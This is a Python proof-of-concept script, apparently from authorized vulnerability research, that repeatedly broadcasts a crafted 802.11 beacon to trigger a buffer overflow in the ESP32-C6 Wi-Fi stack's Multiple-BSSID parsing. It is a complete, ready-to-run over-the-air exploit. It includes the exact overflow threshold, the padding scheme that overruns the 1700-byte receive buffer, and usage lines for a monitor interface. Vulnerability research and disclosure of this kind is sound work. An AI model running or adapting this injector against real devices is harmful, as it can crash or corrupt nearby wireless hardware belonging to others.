#!/usr/bin/env python3
"""Inject a crafted MBSSID beacon on a monitor interface to trigger finding 001.

Authorized security testing (isolated HITL bench, own hardware). Builds an
802.11 beacon carrying a Multiple-BSSID element whose reconstruction exceeds the
ESP32-C6's 1700 B RX/esf_buf (overflow threshold: a beacon whose reconstructed
IEs exceed 1572 B, i.e. a frame >~1622 B). Unlike esp_wifi_80211_tx (capped at
1500 B), a monitor-mode radio has no such limit, so this reaches the ceiling.

Usage (on the rig, driver up + a monitor iface on the target channel):
    python3 inject_mbssid.py <mon_iface> [frame_len] [channel]
e.g. python3 inject_mbssid.py mon0 1650 6
"""
import socket
import struct
import sys
import time

CHANNEL = int(sys.argv[3]) if len(sys.argv) > 3 else 6
FRAME_LEN = int(sys.argv[2]) if len(sys.argv) > 2 else 1650
IFACE = sys.argv[1] if len(sys.argv) > 1 else "mon0"

BSSID = bytes([0x02, 0x00, 0x53, 0x45, 0x43, 0x01])  # locally-administered


def ie(eid, body):
    return bytes([eid, len(body)]) + body


def build_mbssid_element():
    # Multiple-BSSID element (0x47): [MaxBSSID indicator][subelement 0 =
    # nontransmitted BSSID profile]. The closed parser keys on subelement id 0
    # followed by the Multiple-BSSID-Index element (0x53); we then give the
    # profile a *complete* beacon body (capabilities + SSID "ntx" + rates + DS)
    # so the reconstruction synthesizes a real, scannable network — the visible
    # proof (`rx_ntx`) that ieee80211_parse_mbssid ran the reconstruction path.
    prof = b""
    prof += ie(0x53, bytes([0x01, 0x02]))      # Multiple BSSID-Index (index=1)
    prof += ie(0x02, bytes([0x21, 0x04]))      # Nontransmitted BSSID Capability
    prof += ie(0x00, b"ntx")                   # nontransmitted SSID
    prof += ie(0x01, bytes([0x82, 0x84, 0x8b, 0x96]))  # supported rates
    prof += ie(0x03, bytes([CHANNEL]))         # DS Params
    sub = bytes([0x00, len(prof)]) + prof      # subelement id 0
    mbssid_body = bytes([0x02]) + sub          # MaxBSSID indicator (n=2) + sub
    return ie(0x47, mbssid_body)


def build_beacon(total_len):
    # radiotap: version 0, len 8, no present fields (driver defaults).
    radiotap = struct.pack("<BBHI", 0, 0, 8, 0)
    # 802.11 beacon MAC header (24) + fixed params (12).
    hdr = (b"\x80\x00" + b"\x00\x00" + b"\xff" * 6 + BSSID + BSSID + b"\x00\x00")
    fixed = b"\x00" * 8 + struct.pack("<H", 0x0064) + struct.pack("<H", 0x0421)
    # Ordered ascending element IDs (as real beacons do), MBSSID (0x47) BEFORE
    # the vendor pad so the parser reaches it without walking ~1.6 KB of 0xDD.
    ies = b""
    ies += ie(0x00, b"SEC-MBSSID")            # SSID
    ies += ie(0x01, bytes([0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24]))
    ies += ie(0x03, bytes([CHANNEL]))          # DS Params
    ies += ie(0x05, bytes([0x00, 0x01, 0x00, 0x00]))  # TIM
    mbssid = build_mbssid_element()

    # Pad the *transmitted* IE set with vendor IEs up to the target frame size.
    # The reconstruction re-appends the transmitted IE list (incl. this pad)
    # from esf_buf+0x80 with no destination bound, overrunning the 1700 B pool.
    overhead = len(radiotap) + len(hdr) + len(fixed) + len(ies) + len(mbssid)
    pad_target = total_len - overhead
    pad = b""
    while len(pad) < pad_target:
        remaining = pad_target - len(pad)
        blen = min(253, max(1, remaining - 2))
        pad += ie(0xDD, bytes([0x5A]) * blen)
        if remaining <= 2:
            break
    return radiotap + hdr + fixed + ies + mbssid + pad


def main():
    frame = build_beacon(FRAME_LEN)
    on_air = len(frame) - 8  # minus radiotap
    print(f"iface={IFACE} channel={CHANNEL} 802.11_frame={on_air}B "
          f"(overflow threshold ~1622B)")
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    s.bind((IFACE, 0))
    n = 0
    while True:
        try:
            s.send(frame)
        except OSError as e:
            print(f"send error: {e}")
            time.sleep(0.5)
        n += 1
        if n % 500 == 0:
            print(f"tx #{n}")
        time.sleep(0.004)


if __name__ == "__main__":
    main()
